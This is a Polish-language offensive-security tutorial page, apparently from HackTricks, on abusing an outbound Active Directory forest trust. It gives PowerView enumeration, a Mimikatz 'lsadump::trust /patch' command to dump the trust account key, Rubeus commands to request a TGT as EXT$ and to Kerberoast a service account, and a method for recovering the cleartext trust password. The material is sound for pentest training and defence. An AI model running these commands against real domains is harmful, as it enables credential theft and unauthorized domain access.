# Zewnętrzna domena lasu - jednokierunkowa (wyjściowa)

{{#include ../../banners/hacktricks-training.md}}

W tym scenariuszu **twoja domena** **ufa** pewnym **uprawnieniom** dla podmiotu z **innych domen**.

## Enumeracja

### Zaufanie wyjściowe
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Atak na konto zaufania

Występuje luka w zabezpieczeniach, gdy nawiązywana jest relacja zaufania między dwoma domenami, określonymi tutaj jako domena **A** i domena **B**, gdzie domena **B** rozszerza swoje zaufanie do domeny **A**. W tej konfiguracji w domenie **A** tworzone jest specjalne konto dla domeny **B**, które odgrywa kluczową rolę w procesie uwierzytelniania między tymi dwiema domenami. To konto, powiązane z domeną **B**, jest wykorzystywane do szyfrowania biletów do uzyskiwania dostępu do usług w różnych domenach.

Kluczowym aspektem do zrozumienia jest to, że hasło i hash tego specjalnego konta mogą być wyodrębnione z kontrolera domeny w domenie **A** za pomocą narzędzia wiersza poleceń. Polecenie do wykonania tej akcji to:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
To ekstrakcji możliwej, ponieważ konto, oznaczone znakiem **$** po swojej nazwie, jest aktywne i należy do grupy "Domain Users" w domenie **A**, dziedzicząc tym samym uprawnienia związane z tą grupą. Umożliwia to osobom uwierzytelnienie się w domenie **A** przy użyciu poświadczeń tego konta.

**Ostrzeżenie:** Możliwe jest wykorzystanie tej sytuacji do uzyskania dostępu do domeny **A** jako użytkownik, chociaż z ograniczonymi uprawnieniami. Jednak ten dostęp jest wystarczający do przeprowadzenia enumeracji w domenie **A**.

W scenariuszu, w którym `ext.local` jest domeną ufającą, a `root.local` jest domeną zaufaną, konto użytkownika o nazwie `EXT$` zostałoby utworzone w `root.local`. Przy użyciu określonych narzędzi możliwe jest zrzucenie kluczy zaufania Kerberos, ujawniając poświadczenia `EXT$` w `root.local`. Polecenie do osiągnięcia tego to:
```bash
lsadump::trust /patch
```
Następnie można użyć wyodrębnionego klucza RC4 do uwierzytelnienia jako `root.local\EXT$` w `root.local` za pomocą innego polecenia narzędzia:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ten krok uwierzytelniania otwiera możliwość enumeracji, a nawet wykorzystania usług w `root.local`, takich jak przeprowadzenie ataku Kerberoast w celu wyodrębnienia poświadczeń konta usługi za pomocą:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Zbieranie hasła zaufania w postaci czystego tekstu

W poprzednim przepływie użyto hasha zaufania zamiast **hasła w postaci czystego tekstu** (które również zostało **wyciągnięte przez mimikatz**).

Hasło w postaci czystego tekstu można uzyskać, konwertując wyjście \[ CLEAR \] z mimikatz z formatu szesnastkowego i usuwając bajty null ‘\x00’:

![](<../../images/image (938).png>)

Czasami podczas tworzenia relacji zaufania użytkownik musi wpisać hasło dla zaufania. W tej demonstracji klucz to oryginalne hasło zaufania i dlatego jest czytelne dla człowieka. W miarę cyklicznego zmieniania klucza (co 30 dni), hasło w postaci czystego tekstu nie będzie czytelne dla człowieka, ale technicznie nadal będzie użyteczne.

Hasło w postaci czystego tekstu można wykorzystać do przeprowadzenia standardowej autoryzacji jako konto zaufania, co stanowi alternatywę dla żądania TGT przy użyciu tajnego klucza Kerberos konta zaufania. Tutaj zapytanie do root.local z ext.local o członków Domain Admins:

![](<../../images/image (792).png>)

## Odniesienia

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
